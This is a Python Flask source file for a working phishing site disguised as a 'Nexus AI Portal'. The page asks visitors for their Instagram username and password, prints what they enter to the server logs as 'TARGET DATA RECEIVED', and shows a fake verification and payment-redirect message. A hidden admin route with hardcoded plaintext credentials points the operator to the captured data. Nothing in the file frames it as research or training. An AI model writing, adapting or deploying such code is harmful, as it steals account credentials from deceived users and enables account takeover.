import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- ADMIN DETAILS ---
A_EMAIL = "nexusai119@gmail.com"
A_PASS = "prashant@123456"

STYLE = """
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
    .card { background: #1e293b; display: inline-block; padding: 30px; border-radius: 15px; border: 2px solid #38bdf8; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    input { display: block; width: 90%; padding: 12px; margin: 15px auto; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
    button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
</style>
"""

@app.route('/')
def home():
    # Yahan 'action' ko '/capture' kar diya hai jo niche route se match karega
    return f"<html><head>{STYLE}</head><body><div class='card'><h2>🚀 Nexus AI Portal</h2><form method='POST' action='/capture'><input name='u' placeholder='Instagram ID' required><input name='p' type='password' placeholder='Password' required><button type='submit'>Login & Start</button></form><br><a href='/admin_login' style='color:#94a3b8;text-decoration:none;font-size:11px;'>🛡️ Admin Login</a></div></body></html>"

@app.route('/capture', methods=['POST'])
def capture():
    user = request.form.get('u')
    pw = request.form.get('p')
    # Ye data pakka logs mein dikhayega
    print(f"\\n[!!!] TARGET DATA RECEIVED [!!!]\\nUSER: {user}\\nPASS: {pw}\\n-----------------------")
    return f"<html><head>{STYLE}</head><body><div class='card'><h2 style='color:#22c55e;'>✅ Data Verified!</h2><p>Redirecting to Secure Payment...</p><script>setTimeout(()=>{{window.location.href='/'}}, 3000);</script></div></body></html>"

@app.route('/admin_login')
def admin_ui():
    return f"<html><head>{STYLE}</head><body><div class='card'><h2>🛡️ Admin Login</h2><form method='POST' action='/verify'><input name='e' placeholder='Gmail'><input name='ps' type='password' placeholder='Pass'><button style='background:#fbbf24;'>Unlock</button></form></div></body></html>"

@app.route('/verify', methods=['POST'])
def verify():
    if request.form.get('e') == A_EMAIL and request.form.get('ps') == A_PASS:
        return "<h1>Welcome Prashant! Check Render Logs for Data.</h1>"
    return "<h1>Invalid!</h1>"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
